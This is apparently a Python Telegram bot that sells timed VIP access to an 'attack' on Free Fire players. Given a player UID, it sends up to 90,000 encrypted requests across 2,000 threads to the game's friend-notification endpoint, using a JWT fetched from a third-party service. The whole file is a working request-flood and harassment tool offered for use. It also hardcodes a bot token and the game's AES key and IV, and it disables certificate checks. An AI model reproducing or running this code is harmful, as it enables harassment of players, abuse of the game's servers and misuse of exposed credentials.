import telebot
import requests
import urllib3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread, Lock, Event
import time
import json
import os
from datetime import datetime, timedelta
import logging
import psutil
import threading

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8207211294:AAFTAbz6d_IK0iJVe_qKhs3evLuJgtHXpjA"
JWT_API_URL = "https://tmk-acc.vercel.app/api/f7a01dd1ac3c4ed061427c69e2db5f2ac9bfa548b98180ab0aa5246edc635f33"
JWT_FILE = "jwt.json"
VIP_FILE = "vip_users.json"
JWT_REFRESH_INTERVAL = 8 * 60 * 60  # 8 hours

# Admin settings
ADMIN_IDS = [7775944220, 6753603762, 6173509139, 885950845]
OWNER_IDS = [7775944220]

# Attack settings
API_URL = "https://clientbp.ggwhitehawk.com/NotifyVeteranFriendOnline"
MAX_WORKERS = 2000
BATCH_SIZE = 300
MAX_REQUESTS_PER_SESSION = 90000
UPDATE_INTERVAL = 50

# Encryption keys
AES_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
AES_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

# ==================== LOGGING SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)

# ==================== GLOBAL STATE ====================
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=6)
all_active_sessions = {}
session_lock = Lock()
jwt_lock = Lock()
vip_lock = Lock()
current_jwt = None
jwt_timer = None
vip_users = {}
session_counter = 0

# ==================== VIP SYSTEM ====================
def load_vip_users():
    """Load VIP users from file"""
    global vip_users
    try:
        if os.path.exists(VIP_FILE):
            with open(VIP_FILE, 'r') as f:
                data = json.load(f)
                vip_users = {}
                for user_id, expiry_str in data.items():
                    vip_users[int(user_id)] = datetime.fromisoformat(expiry_str)
            logging.info(f"✅ Loaded {len(vip_users)} VIP users")
    except Exception as e:
        logging.error(f"⚠️ Error loading VIP file: {e}")
        vip_users = {}

def save_vip_users():
    """Save VIP users to file"""
    try:
        data = {str(user_id): expiry.isoformat() 
                for user_id, expiry in vip_users.items()}
        with open(VIP_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        logging.error(f"❌ Error saving VIP file: {e}")
        return False

def is_vip_active(user_id):
    """Check if user has active VIP"""
    with vip_lock:
        if user_id in ADMIN_IDS or user_id in OWNER_IDS:
            return True
            
        if user_id in vip_users:
            if datetime.now() < vip_users[user_id]:
                return True
            else:
                del vip_users[user_id]
                save_vip_users()
        return False

def add_vip_user(user_id, days):
    """Add VIP user"""
    with vip_lock:
        expiry = datetime.now() + timedelta(days=days)
        vip_users[user_id] = expiry
        save_vip_users()
        return expiry

def remove_vip_user(user_id):
    """Remove VIP user"""
    with vip_lock:
        if user_id in vip_users:
            del vip_users[user_id]
            save_vip_users()
            return True
        return False

def get_vip_users_count():
    """Get number of VIP users"""
    with vip_lock:
        return len(vip_users)

# ==================== JWT MANAGEMENT ====================
def load_jwt_from_file():
    """Load JWT from file"""
    try:
        if os.path.exists(JWT_FILE):
            with open(JWT_FILE, 'r') as f:
                data = json.load(f)
                if 'token' in data:
                    logging.info("✅ JWT loaded from file")
                    return data['token']
    except Exception as e:
        logging.error(f"⚠️ Error loading JWT file: {e}")
    return None

def save_jwt_to_file(token):
    """Save JWT to file"""
    try:
        data = {
            'token': token,
            'timestamp': datetime.now().isoformat()
        }
        with open(JWT_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        logging.error(f"❌ Error saving JWT: {e}")
        return False

def fetch_new_jwt():
    """Fetch new JWT token"""
    global current_jwt
    logging.info("🔄 Fetching new JWT token...")
    
    try:
        response = requests.get(JWT_API_URL, timeout=15, verify=False)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success' and 'token' in data:
                token = data['token']
                with jwt_lock:
                    current_jwt = token
                save_jwt_to_file(token)
                logging.info("✅ JWT fetched successfully")
                return token
    except Exception as e:
        logging.error(f"❌ Error fetching JWT: {e}")
    return None

def schedule_jwt_refresh():
    """Schedule JWT refresh every 8 hours"""
    def refresh_task():
        time.sleep(JWT_REFRESH_INTERVAL)
        fetch_new_jwt()
        schedule_jwt_refresh()
    
    timer = Thread(target=refresh_task, daemon=True)
    timer.start()

def initialize_jwt():
    """Initialize JWT system"""
    global current_jwt
    logging.info("🔐 Initializing JWT system...")
    
    token = load_jwt_from_file() or fetch_new_jwt()
    if token:
        with jwt_lock:
            current_jwt = token
        schedule_jwt_refresh()
        logging.info("✅ JWT system initialized")
        return True
    return False

# ==================== HELPER FUNCTIONS ====================
def is_authorized(user_id):
    """Check authorization"""
    return user_id in ADMIN_IDS or user_id in OWNER_IDS or is_vip_active(user_id)

def get_system_stats():
    """Get system statistics"""
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    return {
        'cpu_percent': psutil.cpu_percent(interval=1),
        'memory_used': memory.used / (1024 * 1024),
        'memory_total': memory.total / (1024 * 1024),
        'memory_percent': memory.percent,
        'disk_used': disk.used / (1024 * 1024),
        'disk_total': disk.total / (1024 * 1024),
        'disk_percent': disk.percent
    }

# ==================== ENCRYPTION ====================
def encode_player_id(player_id):
    """Encode player ID"""
    num = int(player_id)
    encoded = []
    while True:
        byte = num & 0x7F
        num >>= 7
        if num:
            byte |= 0x80
        encoded.append(byte)
        if not num:
            break
    return bytes(encoded).hex()

def encrypt_payload(hex_data):
    """Encrypt payload"""
    plain_bytes = bytes.fromhex(hex_data)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    encrypted = cipher.encrypt(pad(plain_bytes, AES.block_size))
    return encrypted.hex()

def prepare_request_data(player_id):
    """Prepare request data"""
    encoded_id = encode_player_id(player_id)
    payload = "0a" + encode_player_id(len(encoded_id) // 2) + encoded_id
    return bytes.fromhex(encrypt_payload(payload))

# ==================== HTTP REQUESTS ====================
def send_api_request(data, session):
    """Send API request"""
    with jwt_lock:
        token = current_jwt
    
    if not token:
        return False
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": f"Bearer {token}",
        "X-GA": "v1 1",
        "ReleaseVersion": "OB50",
        "X-Unity-Version": "2018.4.11f1",
        "User-Agent": "Free%20Fire/2019117061 CFNetwork/1399 Darwin/22.1.0",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    
    try:
        response = session.post(API_URL, headers=headers, data=data, 
                              verify=False, timeout=8)
        return response.status_code == 200
    except:
        return False

# ==================== IMPROVED SESSION MANAGEMENT ====================
class AttackSession:
    def __init__(self, user_id, chat_id, player_id, message_id):
        global session_counter
        self.session_id = session_counter
        session_counter += 1
        self.user_id = user_id
        self.chat_id = chat_id
        self.player_id = player_id
        self.message_id = message_id
        self.running = True
        self.success = 0
        self.failed = 0
        self.total = 0
        self.start_time = time.time()
        self.last_update = 0
        self.lock = Lock()
        self.stop_event = Event()
        self.executor = None
        
    def increment_stats(self, success):
        with self.lock:
            self.total += 1
            if success:
                self.success += 1
            else:
                self.failed += 1
    
    def get_stats(self):
        elapsed = time.time() - self.start_time
        rps = self.total / elapsed if elapsed > 0 else 0
        return {
            'total': self.total,
            'success': self.success,
            'failed': self.failed,
            'elapsed': elapsed,
            'rps': rps
        }
    
    def should_update(self):
        current_time = time.time()
        if current_time - self.last_update >= UPDATE_INTERVAL:
            self.last_update = current_time
            return True
        return False
    
    def stop(self):
        """Stop session safely"""
        self.running = False
        self.stop_event.set()
        if self.executor:
            self.executor.shutdown(wait=False, cancel_futures=True)

def update_progress_message(session_obj):
    """Update progress message"""
    stats = session_obj.get_stats()
    
    message_text = (
        f"🔥 *Active Attack*\n\n"
        f"🎯 Target: `{session_obj.player_id}`\n"
        f"✅ Success: `{stats['success']}`\n"
        f"❌ Failed: `{stats['failed']}`\n"
        f"📊 Total: `{stats['total']}`\n"
        f"⚡ Speed: `{stats['rps']:.1f}` req/s\n"
        f"⏱ Duration: `{stats['elapsed']:.1f}s`"
    )
    
    try:
        bot.edit_message_text(
            chat_id=session_obj.chat_id,
            message_id=session_obj.message_id,
            text=message_text,
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error updating message: {e}")

def execute_attack(session_obj):
    """Execute attack"""
    user_id = session_obj.user_id
    
    request_data = prepare_request_data(session_obj.player_id)
    
    http_session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=20,
        pool_maxsize=20,
        max_retries=1
    )
    http_session.mount('https://', adapter)
    
    # Separate ThreadPoolExecutor for each session
    session_obj.executor = ThreadPoolExecutor(
        max_workers=MAX_WORKERS,
        thread_name_prefix=f"Attack_{session_obj.session_id}"
    )
    
    try:
        with session_obj.executor as executor:
            futures = []
            
            for i in range(MAX_REQUESTS_PER_SESSION):
                if not session_obj.running or session_obj.stop_event.is_set():
                    break
                
                future = executor.submit(send_api_request, request_data, http_session)
                futures.append(future)
                
                # Process completed requests periodically
                if len(futures) >= BATCH_SIZE:
                    for f in as_completed(futures[:BATCH_SIZE]):
                        try:
                            result = f.result(timeout=5)
                            session_obj.increment_stats(result)
                        except:
                            session_obj.increment_stats(False)
                    futures = futures[BATCH_SIZE:]
                
                if session_obj.should_update():
                    update_progress_message(session_obj)
            
            # Process remaining requests
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=3)
                    session_obj.increment_stats(result)
                except:
                    session_obj.increment_stats(False)
                    
    except Exception as e:
        logging.error(f"Attack error: {e}")
    finally:
        http_session.close()
        cleanup_session(session_obj)

def cleanup_session(session_obj):
    """Cleanup session after completion"""
    user_id = session_obj.user_id
    player_id = session_obj.player_id
    
    # Final report
    stats = session_obj.get_stats()
    status = "Completed" if session_obj.running else "Stopped"
    
    final_text = (
        f"🏁 *Attack {status}*\n\n"
        f"🎯 Target: `{player_id}`\n"
        f"✅ Success: `{stats['success']}`\n"
        f"❌ Failed: `{stats['failed']}`\n"
        f"📊 Total: `{stats['total']}`\n"
        f"⚡ Avg Speed: `{stats['rps']:.1f}` req/s\n"
        f"⏱ Total Time: `{stats['elapsed']:.1f}s`"
    )
    
    try:
        bot.edit_message_text(
            chat_id=session_obj.chat_id,
            message_id=session_obj.message_id,
            text=final_text,
            parse_mode='Markdown'
        )
    except:
        pass
    
    # Cleanup from memory
    with session_lock:
        if user_id in all_active_sessions:
            all_active_sessions[user_id] = [
                s for s in all_active_sessions[user_id] 
                if s.player_id != player_id
            ]
            if not all_active_sessions[user_id]:
                del all_active_sessions[user_id]

# ==================== BOT COMMANDS (ENGLISH) ====================
@bot.message_handler(commands=['start', 'help'])
def cmd_start(message):
    """Start command"""
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"
    
    if not is_authorized(user_id):
        bot.reply_to(
            message,
            "🚫 *Access Denied*\n\n"
            "❌ You are not authorized to use this bot.\n"
            f"👤 Your ID: `{user_id}`\n\n"
            "💡 Contact the bot owner for access.",
            parse_mode='Markdown'
        )
        return
        
    help_text = (
        f"🤖 *Welcome {user_name}!*\n\n"
        "✅ You are authorized to use this bot.\n\n"
        "📋 *Available Commands:*\n\n"
        "/attack `<UID>` - Start attack\n"
        "/stop - Stop current attack\n"
        "/stopall - Stop all your attacks\n"
        "/status - Check attack status\n"
        "/global - All active attacks\n"
    )
    if user_id in OWNER_IDS:
        help_text += (
            "\n👑 *Owner Commands:*\n"
            "💎 /vip <ID> <days> - Add VIP\n"
            "❌ /by <ID> - Remove VIP\n"
            "📋 /viplist - VIP users list\n"
        )
    
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def cmd_attack(message):
    """Start attack"""
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(
            message,
            "🚫 *Access Denied*\n\n"
            "❌ You are not authorized to use this bot.\n"
            f"👤 Your ID: `{user_id}`\n\n"
            "💡 Contact the bot owner for access.",
            parse_mode='Markdown'
        )
        return
    
    with jwt_lock:
        if not current_jwt:
            bot.reply_to(message, "❌ JWT token not available")
            return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ Usage: `/attack <UID>`", parse_mode='Markdown')
            return
        
        player_id = args[1]
        
        if not player_id.isdigit():
            bot.reply_to(message, "❌ Invalid UID format")
            return
        
        # Check for existing active attack on same target
        with session_lock:
            user_sessions = all_active_sessions.get(user_id, [])
            for session in user_sessions:
                if session.player_id == player_id and session.running:
                    bot.reply_to(message, f"⚠️ Already attacking `{player_id}`!", parse_mode='Markdown')
                    return
        
        # Start new attack
        initial_msg = bot.reply_to(
            message,
            f"🚀 *Starting Attack...*\n\n"
            f"🎯 Target: `{player_id}`\n"
            f"⚙️ Workers: `{MAX_WORKERS}`\n"
            f"⏳ Initializing...",
            parse_mode='Markdown'
        )
        
        session_obj = AttackSession(user_id, message.chat.id, player_id, initial_msg.message_id)
        
        with session_lock:
            if user_id not in all_active_sessions:
                all_active_sessions[user_id] = []
            all_active_sessions[user_id].append(session_obj)
        
        thread = Thread(target=execute_attack, args=(session_obj,), daemon=True)
        thread.start()
        
        logging.info(f"🔥 New attack: user={user_id}, target={player_id}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: `{str(e)}`", parse_mode='Markdown')
        logging.error(f"Attack command error: {e}")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    """Stop specific attack"""
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(
            message,
            "🚫 *Access Denied*\n\n"
            "❌ You are not authorized to use this bot.\n"
            f"👤 Your ID: `{user_id}`\n\n"
            "💡 Contact the bot owner for access.",
            parse_mode='Markdown'
        )
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ Usage: `/stop <UID>`", parse_mode='Markdown')
            return
        
        player_id = args[1]
        stopped = False
        
        with session_lock:
            if user_id in all_active_sessions:
                for session in all_active_sessions[user_id]:
                    if session.player_id == player_id and session.running:
                        session.stop()
                        stopped = True
                        break
        
        if stopped:
            bot.reply_to(message, f"⏹️ Stopping attack on `{player_id}`...", parse_mode='Markdown')
            logging.info(f"⏹️ Stopping attack: user={user_id}, target={player_id}")
        else:
            bot.reply_to(message, f"⚠️ No active attack found for `{player_id}`", parse_mode='Markdown')
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: `{str(e)}`", parse_mode='Markdown')
        logging.error(f"Stop command error: {e}")

@bot.message_handler(commands=['stopall'])
def cmd_stop_all(message):
    """Stop all attacks"""
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(
            message,
            "🚫 *Access Denied*\n\n"
            "❌ You are not authorized to use this bot.\n"
            f"👤 Your ID: `{user_id}`\n\n"
            "💡 Contact the bot owner for access.",
            parse_mode='Markdown'
        )
        return
    
    with session_lock:
        if user_id not in all_active_sessions or not all_active_sessions[user_id]:
            bot.reply_to(message, "⚠️ No active attacks found")
            return
        
        count = 0
        for session in all_active_sessions[user_id]:
            if session.running:
                session.stop()
                count += 1
        
        bot.reply_to(message, f"⏹️ Stopping {count} attacks...")
        logging.info(f"⏹️ Stopping all attacks: user={user_id}, count={count}")

@bot.message_handler(commands=['list'])
def cmd_list(message):
    """List user attacks"""
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(
            message,
            "🚫 *Access Denied*\n\n"
            "❌ You are not authorized to use this bot.\n"
            f"👤 Your ID: `{user_id}`\n\n"
            "💡 Contact the bot owner for access.",
            parse_mode='Markdown'
        )
        return
    
    with session_lock:
        user_sessions = all_active_sessions.get(user_id, [])
        active_sessions = [s for s in user_sessions if s.running]
        
        if not active_sessions:
            bot.reply_to(message, "ℹ️ No active attacks")
            return
        
        attacks_text = "🔥 *Your Active Attacks:*\n\n"
        for i, session in enumerate(active_sessions, 1):
            stats = session.get_stats()
            attacks_text += (
                f"*{i}. UID:* `{session.player_id}`\n"
                f"   ✅ `{stats['success']}` | "
                f"⚡ `{stats['rps']:.1f}`/s | "
                f"⏱ `{stats['elapsed']:.0f}s`\n\n"
            )
        
        bot.reply_to(message, attacks_text, parse_mode='Markdown')

@bot.message_handler(commands=['global'])
def cmd_global(message):
    """Global attacks list"""
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(
            message,
            "🚫 *Access Denied*\n\n"
            "❌ You are not authorized to use this bot.\n"
            f"👤 Your ID: `{user_id}`\n\n"
            "💡 Contact the bot owner for access.",
            parse_mode='Markdown'
        )
        return
    
    with session_lock:
        if not all_active_sessions:
            bot.reply_to(message, "ℹ️ No active attacks globally")
            return
        
        total_attacks = sum(len(sessions) for sessions in all_active_sessions.values())
        total_users = len(all_active_sessions)
        
        global_text = (
            f"🌍 *Global Attack Status*\n\n"
            f"👥 Active Users: `{total_users}`\n"
            f"🔥 Total Attacks: `{total_attacks}`\n\n"
        )
        
        for uid, sessions in all_active_sessions.items():
            active_count = sum(1 for s in sessions if s.running)
            if active_count > 0:
                global_text += f"👤 User `{uid}`: `{active_count}` attacks\n"
        
        bot.reply_to(message, global_text, parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def cmd_status(message):
    """System status"""
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(
            message,
            "🚫 *Access Denied*\n\n"
            "❌ You are not authorized to use this bot.\n"
            f"👤 Your ID: `{user_id}`\n\n"
            "💡 Contact the bot owner for access.",
            parse_mode='Markdown'
        )
        return
    
    with session_lock:
        total_attacks = sum(len(sessions) for sessions in all_active_sessions.values())
        total_users = len(all_active_sessions)
    
    with jwt_lock:
        jwt_status = "🟢 Active" if current_jwt else "🔴 Not available"
    
    # Get system stats
    system_stats = get_system_stats()
    
    status_text = (
        "📊 *System Status*\n\n"

        f"👥 Active Users: `{total_users}`\n"
        f"🔥 Active Attacks: `{total_attacks}`\n"
        f"💎 VIP Users: `{get_vip_users_count()}`\n"
        f"⚙️ Max Workers: `{MAX_WORKERS}`\n\n"
        "🖥️ *System Resources:*\n"
        f"• CPU: `{system_stats['cpu_percent']:.1f}%`\n"
        f"• Memory: `{system_stats['memory_percent']:.1f}%`\n"
        f"• Disk: `{system_stats['disk_percent']:.1f}%`\n\n"

    )
    
    bot.reply_to(message, status_text, parse_mode='Markdown')

@bot.message_handler(commands=['refresh'])
def cmd_refresh(message):
    """Refresh JWT token"""
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(
            message,
            "🚫 *Access Denied*\n\n"
            "❌ You are not authorized to use this bot.\n"
            f"👤 Your ID: `{user_id}`\n\n"
            "💡 Contact the bot owner for access.",
            parse_mode='Markdown'
        )
        return
    
    bot.reply_to(message, "🔄 Refreshing JWT token...")
    if fetch_new_jwt():
        bot.reply_to(message, "✅ JWT token refreshed successfully")
    else:
        bot.reply_to(message, "❌ Failed to refresh JWT token")

@bot.message_handler(commands=['vip'])
def cmd_add_vip(message):
    """Add VIP user"""
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.reply_to(message, "🚫 Owner command only!")
        return
    
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "❌ Usage: `/vip <user_id> <days>`", parse_mode='Markdown')
            return
        
        target_id = int(args[1])
        days = int(args[2])
        
        if days <= 0:
            bot.reply_to(message, "❌ Days must be positive")
            return
        
        expiry = add_vip_user(target_id, days)
        
        bot.reply_to(
            message,
            f"✅ *VIP Added*\n\n"
            f"👤 User ID: `{target_id}`\n"
            f"📅 Duration: `{days}` days\n"
            f"⏰ Expires: `{expiry.strftime('%Y-%m-%d %H:%M')}`",
            parse_mode='Markdown'
        )
        
        # Notify user
        try:
            bot.send_message(
                target_id,
                f"🎉 *VIP Access Granted!*\n\n"
                f"💎 You now have VIP access to the bot!\n"
                f"📅 Duration: `{days}` days\n"
                f"⏰ Expires: `{expiry.strftime('%Y-%m-%d %H:%M')}`\n\n"
                f"Use /help to see available commands.",
                parse_mode='Markdown'
            )
        except:
            pass
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid user ID or days")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: `{str(e)}`", parse_mode='Markdown')

@bot.message_handler(commands=['by'])
def cmd_remove_vip(message):
    """Remove VIP user"""
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.reply_to(message, "🚫 Owner command only!")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ Usage: `/by <user_id>`", parse_mode='Markdown')
            return
        
        target_id = int(args[1])
        
        if remove_vip_user(target_id):
            bot.reply_to(message, f"✅ VIP removed from user `{target_id}`", parse_mode='Markdown')
            
            # Notify user
            try:
                bot.send_message(
                    target_id,
                    "⚠️ *VIP Access Removed*\n\n"
                    "Your VIP access has been revoked.",
                    parse_mode='Markdown'
                )
            except:
                pass
        else:
            bot.reply_to(message, f"⚠️ User `{target_id}` is not VIP", parse_mode='Markdown')
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid user ID")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: `{str(e)}`", parse_mode='Markdown')

@bot.message_handler(commands=['viplist'])
def cmd_vip_list(message):
    """VIP users list"""
    user_id = message.from_user.id
    if user_id not in OWNER_IDS:
        bot.reply_to(message, "🚫 Owner command only!")
        return
    
    with vip_lock:
        if not vip_users:
            bot.reply_to(message, "ℹ️ No VIP users")
            return
        
        now = datetime.now()
        vip_list = []
        
        for user_id, expiry in vip_users.items():
            days_left = (expiry - now).days
            status = "🟢" if days_left > 0 else "🔴"
            vip_list.append(
                f"{status} `{user_id}`\n"
                f"   📅 {expiry.strftime('%Y-%m-%d')} | "
                f"⏳ {days_left} days left"
            )
        
        text = f"💎 *VIP Users ({len(vip_users)})*\n\n" + "\n\n".join(vip_list)
        bot.reply_to(message, text, parse_mode='Markdown')

# ==================== MAIN ====================
def main():
    """Main entry point"""
    print("\n" + "="*50)
    print("🤖 Advanced Attack Bot - Enhanced Version")
    print("="*50)
    print(f"⚙️  Workers: {MAX_WORKERS}")
    print(f"👑 Owners: {len(OWNER_IDS)}")
    print(f"⭐ Admins: {len(ADMIN_IDS)}")
    print(f"🔄 JWT Refresh: 8 hours")
    print("="*50)
    
    # Load data
    load_vip_users()
    
    if not initialize_jwt():
        print("⚠️  Starting without JWT token!")
    
    print("✅ Bot is ready!")
    print("🚀 Enhanced for performance and stability")
    print("⏹️  Press Ctrl+C to stop\n")
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except KeyboardInterrupt:
        print("\n⏹️  Bot stopped")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()